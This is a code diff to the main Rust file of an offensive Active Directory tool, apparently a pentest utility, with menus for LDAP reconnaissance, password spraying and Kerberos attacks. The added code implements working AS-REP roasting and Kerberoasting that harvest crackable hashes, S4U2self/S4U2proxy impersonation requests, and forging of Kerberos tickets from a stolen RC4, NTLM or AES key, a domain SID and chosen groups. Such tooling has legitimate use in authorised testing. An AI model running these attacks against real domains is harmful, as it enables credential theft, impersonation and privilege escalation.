@@ -6,10 +6,12 @@ const LOGO: &str = r#"
 ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░   ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░     ░▒▓█▓▒░     ░▒▓████████▓▒░ 
 
 Multi-purpose LDAP/Kerberos tool | By: Evasive_Ginger
-Kerbtool wrapper for Kerberos protocol attacks
+Native Cerberos library for Kerberos protocol attacks
 "#;
 
+use cerbero_lib;
 use dialoguer::{theme::ColorfulTheme, Confirm, Select};
+use std::net::IpAddr;
 pub mod args;
 pub mod commands;
 pub mod deep_queries;
@@ -19,10 +21,7 @@ pub mod ldap;
 pub mod ldapping;
 pub mod spray;
 
-use crate::args::{
-    calculate_kerberos_hash, configure_socks_proxy, get_cerbero_args, parse_shell_args,
-    CerberoCommand,
-};
+use crate::args::{calculate_kerberos_hash, get_cerbero_args, parse_shell_args, CerberoCommand};
 use args::{
     get_connect_arguments, get_spray_arguments, get_userenum_arguments, run_nested_query_menu,
 };
@@ -31,7 +30,7 @@ use spray::*;
 
 const MAIN_OPTIONS: &[&str] = &[
     "Connect (LDAP Reconissance)",
-    "Kerbtool (Kerberos Protocol Attacks)",
+    "Cerberos (Kerberos Protocol Attacks)",
     "User Enumeration (LDAP Ping Method)",
     "Password Spray (LDAP)",
     "Generate KRB5 Conf",
@@ -73,7 +72,7 @@ fn main() {
             2 => handle_user_enumeration(),
             3 => handle_password_spray(),
             4 => handle_krb5_config(),
-            5 => println!("v1.3"), // Version
+            5 => println!("v{}", env!("CARGO_PKG_VERSION")),
             6 => show_help_main(),
             7 => {
                 if confirm_exit() {
@@ -249,14 +248,14 @@ fn handle_net_commands(
 
     if args.len() < 2 {
         eprintln!("Error: net command requires type (user/group) and name");
-        eprintln!("Usage: net <user|group> <name>");
+        eprintln!("Usage: net <user|group> <n>");
         return;
     }
 
     let command_type = args[0].to_lowercase();
     if !matches!(command_type.as_str(), "user" | "group") {
         eprintln!("Error: net command type must be either 'user' or 'group'");
-        eprintln!("Usage: net <user|group> <name>");
+        eprintln!("Usage: net <user|group> <n>");
         return;
     }
 
@@ -269,35 +268,477 @@ fn handle_net_commands(
 
 fn handle_cerbero() {
     match get_cerbero_args() {
-        CerberoCommand::Arguments(args) => {
-            let args_vec = parse_shell_args(&args);
-            let args_refs: Vec<&str> = args_vec.iter().map(|s| s.as_str()).collect();
-            match kerberos::kerbtool::run_kerbtool(&args_refs) {
-                Ok(output) => {
-                    if !output.stdout.is_empty() {
-                        println!("{}", output.stdout);
-                    }
-                    if !output.stderr.is_empty() {
-                        eprintln!("{}", output.stderr);
-                    }
-                    if !output.success {
-                        eprintln!("[!] Kerbtool command failed");
+        CerberoCommand::AskTgt {
+            username,
+            password,
+            domain,
+            dc_ip,
+            output,
+            hash,
+        } => {
+            let ip: IpAddr = match dc_ip.parse() {
+                Ok(ip) => ip,
+                Err(_) => {
+                    eprintln!("[!] Invalid IP address: {}", dc_ip);
+                    return;
+                }
+            };
+
+            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);
+
+            let result = if let Some(hash_value) = hash {
+                ops.ask_tgt_hash(&username, &hash_value, &output)
+            } else {
+                ops.ask_tgt(&username, &password, &output)
+            };
+
+            match result {
+                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
+                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
+            }
+        }
+        CerberoCommand::AskTgs {
+            username,
+            password,
+            domain,
+            dc_ip,
+            service,
+            output,
+        } => {
+            let ip: IpAddr = match dc_ip.parse() {
+                Ok(ip) => ip,
+                Err(_) => {
+                    eprintln!("[!] Invalid IP address: {}", dc_ip);
+                    return;
+                }
+            };
+
+            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);
+
+            match ops.ask_tgs(&username, &password, &service, &output) {
+                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
+                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
+            }
+        }
+        CerberoCommand::AskS4u2self {
+            username,
+            password,
+            domain,
+            dc_ip,
+            impersonate,
+            output,
+        } => {
+            let ip: IpAddr = match dc_ip.parse() {
+                Ok(ip) => ip,
+                Err(_) => {
+                    eprintln!("[!] Invalid IP address: {}", dc_ip);
+                    return;
+                }
+            };
+
+            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);
+
+            match ops.ask_s4u2self(&username, &password, &impersonate, &output) {
+                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
+                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
+            }
+        }
+        CerberoCommand::AskS4u2proxy {
+            username,
+            password,
+            domain,
+            dc_ip,
+            impersonate,
+            service,
+            output,
+        } => {
+            let ip: IpAddr = match dc_ip.parse() {
+                Ok(ip) => ip,
+                Err(_) => {
+                    eprintln!("[!] Invalid IP address: {}", dc_ip);
+                    return;
+                }
+            };
+
+            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);
+
+            match ops.ask_s4u2proxy(&username, &password, &impersonate, &service, &output) {
+                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
+                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
+            }
+        }
+        CerberoCommand::AsrepRoast {
+            domain,
+            dc_ip,
+            target,
+            output,
+            format,
+        } => {
+            use std::path::Path;
+
+            let ip: IpAddr = match dc_ip.parse() {
+                Ok(ip) => ip,
+                Err(_) => {
+                    eprintln!("[!] Invalid IP address: {}", dc_ip);
+                    return;
+                }
+            };
+
+            let ops = crate::kerberos::KerberosOps::new(&domain, ip);
+
+            // Determine crack format
+            let crack_format = if format == "john" {
+                cerbero_lib::CrackFormat::John
+            } else {
+                cerbero_lib::CrackFormat::Hashcat
+            };
+
+            // Check if target is a file or a single user
+            let hashes = if Path::new(&target).exists() {
+                match ops.asreproast_file(&target, crack_format) {
+                    Ok(h) => h,
+                    Err(e) => {
+                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
+                        return;
                     }
                 }
-                Err(e) => eprintln!("[!] Failed to execute Kerbtool: {}", e),
+            } else {
+                match ops.asreproast_user(&target, crack_format) {
+                    Ok(h) => vec![h],
+                    Err(e) => {
+                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
+                        return;
+                    }
+                }
+            };
+
+            // Output results
+            if let Some(output_file) = output {
+                use std::fs::File;
+                use std::io::Write;
+
+                match File::create(&output_file) {
+                    Ok(mut file) => {
+                        for hash in &hashes {
+                            writeln!(file, "{}", hash).ok();
+                        }
+                        println!("\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_file);
+                    }
+                    Err(e) => eprintln!("\x1b[31m[!] Failed to write output: {}\x1b[0m", e),
+                }
+            } else {
+                // Print to stdout
+                for hash in &hashes {
+                    println!("{}", hash);
+                }
+            }
+
+            if !hashes.is_empty() {
+                println!("\x1b[32m[+] AS-REP roasting complete\x1b[0m");
+            }
+        }
+        CerberoCommand::Kerberoast {
+            username,
+            password,
+            domain,
+            dc_ip,
+            target,
+            output,
+            format,
+        } => {
+            use std::path::Path;
+
+            let ip: IpAddr = match dc_ip.parse() {
+                Ok(ip) => ip,
+                Err(_) => {
+                    eprintln!("[!] Invalid IP address: {}", dc_ip);
+                    return;
+                }
+            };
+
+            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);
+
+            let crack_format = if format == "john" {
+                cerbero_lib::CrackFormat::John
+            } else {
+                cerbero_lib::CrackFormat::Hashcat
+            };
+
+            let hashes = if Path::new(&target).exists() {
+                match ops.kerberoast_file(&username, &password, &target, crack_format) {
+                    Ok(h) => h,
+                    Err(e) => {
+                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
+                        return;
+                    }
+                }
+            } else {
+                // Single target (user:spn format)
+                let parts: Vec<&str> = target.split(':').collect();
+                if parts.len() != 2 {
+                    eprintln!("\x1b[31m[!] Invalid target format. Use 'user:spn' or provide a file\x1b[0m");
+                    return;
+                }
+
+                match ops.kerberoast_service(&username, &password, parts[0], parts[1], crack_format)
+                {
+                    Ok(h) => vec![h],
+                    Err(e) => {
+                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
+                        return;
+                    }
+                }
+            };
+
+            if let Some(output_file) = output {
+                use std::fs::File;
+                use std::io::Write;
+
+                match File::create(&output_file) {
+                    Ok(mut file) => {
+                        for hash in &hashes {
+                            writeln!(file, "{}", hash).ok();
+                        }
+                        println!("\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_file);
+                    }
+                    Err(e) => eprintln!("\x1b[31m[!] Failed to write output: {}\x1b[0m", e),
+                }
+            } else {
+                for hash in &hashes {
+                    println!("{}", hash);
+                }
+            }
+
+            if !hashes.is_empty() {
+                println!(
+                    "\x1b[32m[+] Kerberoast complete: {} hash(es)\x1b[0m",
+                    hashes.len()
+                );
+            }
+        }
+        CerberoCommand::Convert {
+            input,
+            output,
+            format,
+        } => {
+            use cerbero_lib::{CredFormat, FileVault, Vault};
+            use std::path::Path;
+
+            if !Path::new(&input).exists() {
+                eprintln!("\x1b[31m[!] Input file not found: {}\x1b[0m", input);
+                return;
+            }
+
+            let in_vault = FileVault::new(input.clone());
+
+            let tickets = match in_vault.dump() {
+                Ok(t) => t,
+                Err(e) => {
+                    eprintln!("\x1b[31m[!] Failed to read input file: {}\x1b[0m", e);
+                    return;
+                }
+            };
+
+            if tickets.is_empty() {
+                eprintln!("\x1b[31m[!] Input file is empty or contains no valid tickets\x1b[0m");
+                return;
+            }
+
+            let in_format = match in_vault.support_cred_format() {
+                Ok(Some(f)) => f,
+                _ => {
+                    eprintln!("\x1b[31m[!] Unable to detect input file format\x1b[0m");
+                    return;
+                }
+            };
+
+            println!("[*] Read {} with {} format", input, in_format);
+
+            let out_format = if let Some(fmt) = format {
+                match fmt.as_str() {
+                    "krb" => CredFormat::Krb,
+                    "ccache" => CredFormat::Ccache,
+                    "auto" => {
+                        if let Some(detected) = CredFormat::from_file_extension(&output) {
+                            println!(
+                                "[*] Detected {} format from output file extension",
+                                detected
+                            );
+                            detected
+                        } else {
+                            println!("[*] No extension detected, using opposite of input format");
+                            in_format.contrary()
+                        }
+                    }
+                    _ => {
+                        eprintln!("\x1b[31m[!] Invalid format\x1b[0m");
+                        return;
+                    }
+                }
+            } else {
+                if let Some(detected) = CredFormat::from_file_extension(&output) {
+                    println!(
+                        "[*] Detected {} format from output file extension",
+                        detected
+                    );
+                    detected
+                } else {
+                    println!("[*] No extension detected, using opposite of input format");
+                    in_format.contrary()
+                }
+            };
+
+            let out_vault = FileVault::new(output.clone());
+            match out_vault.save_as(tickets, out_format) {
+                Ok(_) => {
+                    println!("[*] Saved {} with {} format", output, out_format);
+                    println!("\x1b[32m[+] Conversion complete\x1b[0m");
+                }
+                Err(e) => {
+                    eprintln!("\x1b[31m[!] Failed to save output file: {}\x1b[0m", e);
+                }
+            }
+        }
+        CerberoCommand::Craft {
+            user,
+            sid,
+            user_rid,
+            service,
+            key_type,
+            key_value,
+            groups,
+            output,
+            format,
+        } => {
+            use cerbero_lib::{
+                craft_ticket_info, CredFormat, FileVault, KrbUser, TicketCreds, Vault,
+            };
+            use kerberos_crypto::Key;
+            use ms_pac::PISID;
+            use std::convert::TryInto;
+
+            let krb_user: KrbUser = match user.as_str().try_into() {
+                Ok(u) => u,
+                Err(e) => {
+                    eprintln!("\x1b[31m[!] Invalid user format: {}\x1b[0m", e);
+                    return;
+                }
+            };
+
+            let realm_sid: PISID = match sid.as_str().try_into() {
+                Ok(s) => s,
+                Err(_) => {
+                    eprintln!("\x1b[31m[!] Invalid SID format: {}\x1b[0m", sid);
+                    return;
+                }
+            };
+
+            let user_key = match key_type.to_lowercase().as_str() {
+                "password" => Key::Secret(key_value),
+                "rc4" | "ntlm" => {
+                    let key_bytes = match hex::decode(&key_value) {
+                        Ok(b) => b,
+                        Err(_) => {
+                            eprintln!("\x1b[31m[!] Invalid RC4/NTLM hash\x1b[0m");
+                            return;
+                        }
+                    };
+                    match key_bytes.try_into() {
+                        Ok(k) => Key::RC4Key(k),
+                        Err(_) => {
+                            eprintln!("\x1b[31m[!] RC4 key must be 16 bytes (32 hex chars)\x1b[0m");
+                            return;
+                        }
+                    }
+                }
+                "aes128" => {
+                    let key_bytes = match hex::decode(&key_value) {
+                        Ok(b) => b,
+                        Err(_) => {
+                            eprintln!("\x1b[31m[!] Invalid AES128 key\x1b[0m");
+                            return;
+                        }
+                    };
+                    match key_bytes.try_into() {
+                        Ok(k) => Key::AES128Key(k),
+                        Err(_) => {
+                            eprintln!(
+                                "\x1b[31m[!] AES128 key must be 16 bytes (32 hex chars)\x1b[0m"
+                            );
+                            return;
+                        }
+                    }
+                }
+                "aes256" | "aes" => {
+                    let key_bytes = match hex::decode(&key_value) {
+                        Ok(b) => b,
+                        Err(_) => {
+                            eprintln!("\x1b[31m[!] Invalid AES256 key\x1b[0m");
+                            return;
+                        }
+                    };
+                    match key_bytes.try_into() {
+                        Ok(k) => Key::AES256Key(k),
+                        Err(_) => {
+                            eprintln!(
+                                "\x1b[31m[!] AES256 key must be 32 bytes (64 hex chars)\x1b[0m"
+                            );
+                            return;
+                        }
+                    }
+                }
+                _ => {
+                    eprintln!("\x1b[31m[!] Invalid key type. Use: password, rc4, aes128, or aes256\x1b[0m");
+                    return;
+                }
+            };
+
+            let cred_format = match format.to_lowercase().as_str() {
+                "krb" => CredFormat::Krb,
+                "ccache" => CredFormat::Ccache,
+                _ => {
+                    eprintln!("\x1b[31m[!] Invalid format. Use 'ccache' or 'krb'\x1b[0m");
+                    return;
+                }
+            };
+
+            println!("[*] Crafting ticket...");
+
+            let ticket_info = craft_ticket_info(
+                krb_user.clone(),
+                service.clone(),
+                user_key,
+                user_rid,
+                realm_sid,
+                &groups,
+                None,
+            );
+
+            let krb_cred = TicketCreds::new(vec![ticket_info]);
+            let vault = FileVault::new(output.clone());
+
+            match vault.save_as(krb_cred, cred_format) {
+                Ok(_) => {
+                    if let Some(ref spn) = service {
+                        println!("[*] Saved {} TGS for {} in {}", krb_user.name, spn, output);
+                    } else {
+                        println!("[*] Saved {} TGT in {}", krb_user.name, output);
+                    }
+                    println!("\x1b[32m[+] Ticket crafted successfully\x1b[0m");
+                }
+                Err(e) => {
+                    eprintln!("\x1b[31m[!] Failed to save ticket: {:?}\x1b[0m", e);
+                }
             }
         }
         CerberoCommand::Export(path) => {
             println!("[+] KRB5CCNAME environment variable set to: {}", path);
             std::env::set_var("KRB5CCNAME", path);
         }
-        CerberoCommand::Socks => {
-            configure_socks_proxy();
-        }
         CerberoCommand::Hash => {
             calculate_kerberos_hash();
         }
-        CerberoCommand::None => eprintln!("[!] No valid Kerbtool command provided."),
+        CerberoCommand::None => {}
     }
 }
 
